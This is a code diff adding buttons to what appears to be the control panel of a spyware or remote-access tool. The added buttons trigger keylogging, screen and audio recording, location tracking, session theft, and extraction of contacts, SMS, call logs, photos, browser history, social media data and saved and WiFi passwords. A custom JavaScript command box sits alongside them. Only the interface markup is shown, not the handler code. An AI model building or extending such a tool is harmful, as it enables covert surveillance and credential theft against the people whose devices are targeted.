@@ -562,6 +562,127 @@
                                     </div>
                                 </div>
 
+                                <!-- Advanced Commands ---->
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-4">
+                                    <h3 class="text-sm font-bold text-slate-400 mb-3">⚡ Advanced Surveillance</h3>
+                                    <div class="grid grid-cols-2 md:grid-cols-4 gap-2">
+                                        <button onclick="startKeylogger()"
+                                            class="px-3 py-2 bg-red-500/10 text-red-400 rounded hover:bg-red-500/20 text-sm border border-red-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-keyboard"></i>
+                                            <span>Start Keylogger</span>
+                                        </button>
+                                        <button onclick="getKeylogs()"
+                                            class="px-3 py-2 bg-orange-500/10 text-orange-400 rounded hover:bg-orange-500/20 text-sm border border-orange-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-download"></i>
+                                            <span>Get Keylogs</span>
+                                        </button>
+                                        <button onclick="startScreenshot()"
+                                            class="px-3 py-2 bg-purple-500/10 text-purple-400 rounded hover:bg-purple-500/20 text-sm border border-purple-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-camera-retro"></i>
+                                            <span>Auto Screenshot</span>
+                                        </button>
+                                        <button onclick="recordAudio()"
+                                            class="px-3 py-2 bg-pink-500/10 text-pink-400 rounded hover:bg-pink-500/20 text-sm border border-pink-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-microphone"></i>
+                                            <span>Record Audio</span>
+                                        </button>
+                                        <button onclick="watchLocation()"
+                                            class="px-3 py-2 bg-blue-500/10 text-blue-400 rounded hover:bg-blue-500/20 text-sm border border-blue-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-map-marked-alt"></i>
+                                            <span>Watch Location</span>
+                                        </button>
+                                        <button onclick="stealSession()"
+                                            class="px-3 py-2 bg-red-600/10 text-red-500 rounded hover:bg-red-600/20 text-sm border border-red-600/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-user-secret"></i>
+                                            <span>Steal Session</span>
+                                        </button>
+                                        <button onclick="startScreenRecord()"
+                                            class="px-3 py-2 bg-indigo-500/10 text-indigo-400 rounded hover:bg-indigo-500/20 text-sm border border-indigo-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-video"></i>
+                                            <span>Screen Record</span>
+                                        </button>
+                                        <button onclick="getAllData()"
+                                            class="px-3 py-2 bg-gradient-to-r from-red-500/10 to-orange-500/10 text-red-400 rounded hover:from-red-500/20 hover:to-orange-500/20 text-sm border border-red-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-database"></i>
+                                            <span>Get ALL Data</span>
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Data Extraction -->
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-4">
+                                    <h3 class="text-sm font-bold text-slate-400 mb-3">📱 Data Extraction</h3>
+                                    <div class="grid grid-cols-2 md:grid-cols-4 gap-2">
+                                        <button onclick="getContacts()"
+                                            class="px-3 py-2 bg-green-500/10 text-green-400 rounded hover:bg-green-500/20 text-sm border border-green-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-address-book"></i>
+                                            <span>Contacts</span>
+                                        </button>
+                                        <button onclick="getSMS()"
+                                            class="px-3 py-2 bg-blue-500/10 text-blue-400 rounded hover:bg-blue-500/20 text-sm border border-blue-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-sms"></i>
+                                            <span>SMS</span>
+                                        </button>
+                                        <button onclick="getCallLogs()"
+                                            class="px-3 py-2 bg-purple-500/10 text-purple-400 rounded hover:bg-purple-500/20 text-sm border border-purple-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-phone"></i>
+                                            <span>Call Logs</span>
+                                        </button>
+                                        <button onclick="getPhotos()"
+                                            class="px-3 py-2 bg-pink-500/10 text-pink-400 rounded hover:bg-pink-500/20 text-sm border border-pink-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-images"></i>
+                                            <span>Photos</span>
+                                        </button>
+                                        <button onclick="getVideos()"
+                                            class="px-3 py-2 bg-red-500/10 text-red-400 rounded hover:bg-red-500/20 text-sm border border-red-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-film"></i>
+                                            <span>Videos</span>
+                                        </button>
+                                        <button onclick="getFiles()"
+                                            class="px-3 py-2 bg-yellow-500/10 text-yellow-400 rounded hover:bg-yellow-500/20 text-sm border border-yellow-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-folder"></i>
+                                            <span>Files</span>
+                                        </button>
+                                        <button onclick="getInstalledApps()"
+                                            class="px-3 py-2 bg-indigo-500/10 text-indigo-400 rounded hover:bg-indigo-500/20 text-sm border border-indigo-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-th"></i>
+                                            <span>Installed Apps</span>
+                                        </button>
+                                        <button onclick="getBrowserHistory()"
+                                            class="px-3 py-2 bg-cyan-500/10 text-cyan-400 rounded hover:bg-cyan-500/20 text-sm border border-cyan-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-history"></i>
+                                            <span>History</span>
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- More Social Media -->
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-4">
+                                    <h3 class="text-sm font-bold text-slate-400 mb-3">🌐 More Social Media</h3>
+                                    <div class="grid grid-cols-2 md:grid-cols-4 gap-2">
+                                        <button onclick="getTwitter()"
+                                            class="px-3 py-2 bg-gradient-to-r from-blue-400/10 to-cyan-400/10 text-blue-400 rounded hover:from-blue-400/20 hover:to-cyan-400/20 text-sm border border-blue-400/20 flex items-center justify-center space-x-2">
+                                            <i class="fab fa-twitter"></i>
+                                            <span>Twitter/X</span>
+                                        </button>
+                                        <button onclick="getTelegram()"
+                                            class="px-3 py-2 bg-gradient-to-r from-blue-500/10 to-sky-500/10 text-blue-400 rounded hover:from-blue-500/20 hover:to-sky-500/20 text-sm border border-blue-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fab fa-telegram"></i>
+                                            <span>Telegram</span>
+                                        </button>
+                                        <button onclick="getSavedPasswords()"
+                                            class="px-3 py-2 bg-gradient-to-r from-red-500/10 to-pink-500/10 text-red-400 rounded hover:from-red-500/20 hover:to-pink-500/20 text-sm border border-red-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-key"></i>
+                                            <span>Passwords</span>
+                                        </button>
+                                        <button onclick="getWiFiPasswords()"
+                                            class="px-3 py-2 bg-gradient-to-r from-purple-500/10 to-indigo-500/10 text-purple-400 rounded hover:from-purple-500/20 hover:to-indigo-500/20 text-sm border border-purple-500/20 flex items-center justify-center space-x-2">
+                                            <i class="fas fa-wifi"></i>
+                                            <span>WiFi Passwords</span>
+                                        </button>
+                                    </div>
+                                </div>
+
                                 <!-- Custom Command -->
                                 <div class="bg-slate-900 rounded-xl border border-slate-800 p-4">
                                     <h3 class="text-sm font-bold text-slate-400 mb-3">Custom JavaScript</h3>
